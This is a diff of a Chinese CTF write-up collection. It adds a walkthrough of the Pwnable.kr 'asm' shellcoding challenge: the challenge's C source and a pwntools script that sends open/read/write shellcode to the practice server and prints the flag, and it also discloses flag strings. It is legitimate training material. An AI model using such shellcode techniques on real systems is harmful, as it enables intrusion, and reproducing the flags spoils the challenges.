@@ -10914,7 +10914,7 @@ io.interactive()
 
 ### memcpy
 
-这是**Pwnable.kr**的第十七个挑战`uaf`，来自**[Toddler's Bottle]**部分。
+这是**Pwnable.kr**的第十七个挑战`memcpy`，来自**[Toddler's Bottle]**部分。
 
 ```bash
 Are you tired of hacking?, take some rest here.
@@ -11172,6 +11172,152 @@ flag : 1_w4nn4_br34K_th3_m3m0ry_4lignm3nt
 
 ```bash
 memcpy@pwnable:~$ echo "12 28 60 124 252 508 1020 2044 4092 8188" | nc 0 9022
+```
+
+------
+
+### asm
+
+这是**Pwnable.kr**的第十八个挑战`asm`，来自**[Toddler's Bottle]**部分。
+
+```bash
+Mommy! I think I know how to make shellcodes
+
+ssh asm@pwnable.kr -p2222 (pw: guest)
+```
+
+首先通过`ssh`远程连接目标主机。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
+└─$ ssh asm@pwnable.kr -p2222
+asm@pwnable.kr's password: 
+ ____  __    __  ____    ____  ____   _        ___      __  _  ____  
+|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \ 
+|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  ' / |  D  )
+|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    / 
+|  |  |  `  '  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \ 
+|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \
+|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|
+                                                                     
+- Site admin : daehee87@khu.ac.kr
+- irc.netgarage.org:6667 / #pwnable.kr
+- Simply type "irssi" command to join IRC now
+- files under /tmp can be erased anytime. make your directory under /tmp
+- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal
+You have mail.
+Last login: Fri Jun  9 14:35:57 2023 from 147.235.217.79
+```
+
+然后输入`ls -la`显示所有文件及目录，并将文件型态、权限、拥有者、文件大小等信息详细列出。
+
+```bash
+asm@pwnable:~$ ls -la
+total 48
+drwxr-x---   5 root asm   4096 Jan  2  2017 .
+drwxr-xr-x 117 root root  4096 Nov 10  2022 ..
+-rwxr-xr-x   1 root root 13704 Nov 29  2016 asm
+-rw-r--r--   1 root root  1793 Nov 29  2016 asm.c
+d---------   2 root root  4096 Nov 19  2016 .bash_history
+dr-xr-xr-x   2 root root  4096 Nov 25  2016 .irssi
+drwxr-xr-x   2 root root  4096 Jan  2  2017 .pwntools-cache
+-rw-r--r--   1 root root   211 Nov 19  2016 readme
+-rw-r--r--   1 root root    67 Nov 19  2016 this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong
+```
+
+我们可以看到四个文件`readme`、`asm`、`asm.c`和`this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong`，其中`asm`是`ELF`二进制可执行文件，`asm.c`是编译二进制文件的`C`代码，用户`asm`没有权限直接查看这个名字很长的`flag`文件中的内容。输入`cat readme`来查看提示：
+
+```bash
+asm@pwnable:~$ cat readme
+once you connect to port 9026, the "asm" binary will be executed under asm_pwn privilege.
+make connection to challenge (nc 0 9026) then get the flag. (file name of the flag is same as the one in this directory)
+```
+
+一旦`nc`连接到`9026`端口，`asm.c`源代码编译的二进制文件`asm`（含有flag）将在`asm_pwn`权限下执行。查看`asm.c`的源代码：
+
+```c
+asm@pwnable:~$ cat asm.c
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <sys/mman.h>
+#include <seccomp.h>
+#include <sys/prctl.h>
+#include <fcntl.h>
+#include <unistd.h>
+
+#define LENGTH 128
+
+void sandbox(){
+    scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);
+    if (ctx == NULL) {
+        printf("seccomp error\n");
+        exit(0);
+    }
+
+    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
+    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
+    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
+    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
+    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);
+
+    if (seccomp_load(ctx) < 0){
+        seccomp_release(ctx);
+        printf("seccomp error\n");
+        exit(0);
+    }
+    seccomp_release(ctx);
+}
+
+char stub[] = "\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff";
+unsigned char filter[256];
+int main(int argc, char* argv[]){
+    setvbuf(stdout, 0, _IONBF, 0);
+    setvbuf(stdin, 0, _IOLBF, 0);
+
+    printf("Welcome to shellcoding practice challenge.\n");
+    printf("In this challenge, you can run your x64 shellcode under SECCOMP sandbox.\n");
+    printf("Try to make shellcode that spits flag using open()/read()/write() systemcalls only.\n");
+    printf("If this does not challenge you. you should play 'asg' challenge :)\n");
+
+    char* sh = (char*)mmap(0x41414000, 0x1000, 7, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, 0, 0);
+    memset(sh, 0x90, 0x1000);
+    memcpy(sh, stub, strlen(stub));
+
+    int offset = sizeof(stub);
+    printf("give me your x64 shellcode: ");
+    read(0, sh+offset, 1000);
+
+    alarm(10);
+    chroot("/home/asm_pwn");        // you are in chroot jail. so you can't use symlink in /tmp
+    sandbox();
+    ((void (*)(void))sh)();
+    return 0;
+}
+```
+
+审计代码后发现，我们需要用汇编代码构成`shellcode`来读取`flag`。
+
+编写`Python`代码进行求解，得到`flag`：`Mak1ng_shelLcodE_i5_veRy_eaSy`。
+
+```python
+from pwn import *
+
+context(arch='amd64', os='linux', log_level='debug')
+io = remote('pwnable.kr', 9026)
+filename = 'this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong'
+shellcode = shellcraft.open(filename)
+shellcode += shellcraft.read('rax', 'rsp', 100)
+shellcode += shellcraft.write(1, 'rsp', 100)
+shellcode += shellcraft.exit(0)
+payload = asm(shellcode)
+io.recvuntil('give me your x64 shellcode: ')
+io.sendline(payload)
+flag = io.recv()
+log.success(flag)
+# Mak1ng_shelLcodE_i5_veRy_eaSy
+# lease_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooo
+io.close()
 ```
 
 ------
